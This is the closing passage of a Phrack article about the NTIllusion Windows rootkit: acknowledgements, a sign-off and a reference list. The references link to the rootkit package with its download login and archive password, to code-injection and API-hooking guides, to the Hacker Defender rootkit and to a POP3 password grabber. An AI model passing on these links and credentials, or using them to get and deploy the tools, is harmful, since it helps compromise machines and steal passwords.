+helped me set up a more accessible paper. I hope this goal is achieved.
+Finally, I salute my friends and teammates; you know who you are. 
+Special thanks to my buddy and personal unix consultant Artyc.
+
+That's all folks!
+
+"I tried so hard, and gone so far. But in the end, it doesn’t even
+matter..."
+
+
+Kdm 
+Kodmaker@syshell.org
+http://www.syshell.org/
+
+
+
+-------[ 6. References
+- [1]
+http://www.syshell.org/?r=../phrack62/NTILLUSION_fullpack.txt
+- [NTillusion rootkit]
+http://www.syshell.org/?r=../phrack62/NTIllusion.rar
+Login/Pass	:	phrackreaders/ph4e#ho5
+Rar password	: 	0wnd4wurld
+- [HIDINGEN]
+http://rootkit.host.sk/knowhow/hidingen.txt
+- [HOOKS] A HowTo for setting system wide hooks
+http://www.codeguru.com/Cpp/W-P/system/misc/article.php/c5685/ 
+- [MSDN_HOOKS]
+http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/WinUI/
+WindowsUserInterface/Windowing/Hooks.asp
+- [3WAYS] Three ways to inject your code into another process 
+http://www.codeguru.com/Cpp/W-P/system/processesmodules/article.php/c5767/
+- [LSD] Win32 assembly components 
+http://www.lsd-pl.net/documents/winasm-1.0.1.pdf 
+- [THCONTEXT] GetThreadContext remote code triggering proof of concept 
+http://www.syshell.org/?r=Rootkit/Code_Injection/GetSetThreadContex/kCtxIn
+ject/
+- [REMOTETH] 
+http://win32.mvps.org/processes/remthread.html
+- [PE]
+http://www.syshell.org/?r=Rootkit/PE/Doc/MattPietrek
+- [IVANOV]
+http://www.codeguru.com/Cpp/W-P/system/misc/article.php/c5667/
+- [UNLEASHED]
+http://www.codeproject.com/system/api_monitoring_unleashed.asp
+- [DETOURS] Detours win32 functions interception
+http://research.microsoft.com/sn/detours/
+[HKDEF_RTK] Hacker Defender rootkit
+http://rootkit.host.sk/
+- [HKDEF] Hacker Defender (Holy_Father 2002)
+http://rootkit.host.sk/knowhow/hookingen.txt
+- [ZOMBIE2] Entry point rewriting
+http://www.syshell.org/?r=Rootkit/Api_Hijack/Code/EntryPointRewritting/
+- [EXPLORIAT]
+http://www.syshell.org/?r=Rootkit/Snippets/ExplorerIAT2k.log
+- [MSDN] Microsoft Developers Network 
+http://msdn.microsoft.com/library/
+- [NtQuerySystemInformation]
+http://msdn.microsoft.com/library/default.asp?url=/library/en-
+us/sysinfo/base/ntquerysysteminformation.asp
+- [GETTCP] GetTcpTable
+http://msdn.microsoft.com/library/default.asp?url=/library/en-
+us/iphlp/iphlp/gettcptable.asp
+- [NETSTATP] Netstat like
+http://www.sysinternals.com/files/netstatp.zip
+- [kSENTINEL] POP3 passwords grabber
+http://www.syshell.org/?r=Rootkit/Releases/POP3_Stealer/kSentinel/kSentine
+l.c
+- [FPORT] Network Tool
+http://foundstone.com/resources/freetools/fport.zip
+- [TCPVIEW] Network Tool
+http://www.sysinternals.com/ntw2k/source/tcpview.shtml
+- [LISTDLLS] DLL listing tool
+http://www.sysinternals.com/ntw2k/freeware/listdlls.shtml
+- [PROCEXP] Process Explorer
+http://www.sysinternals.com/ntw2k/freeware/procexp.shtml
+- [VICE] Catch hookers!
+http://www.rootkit.com
+- [PEB]
+http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%2
+0Objects/Process/PEB.html
+- [PEBSHLCDE]
+http://madchat.org/coding/w32nt.rev/RW32GS.txt
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
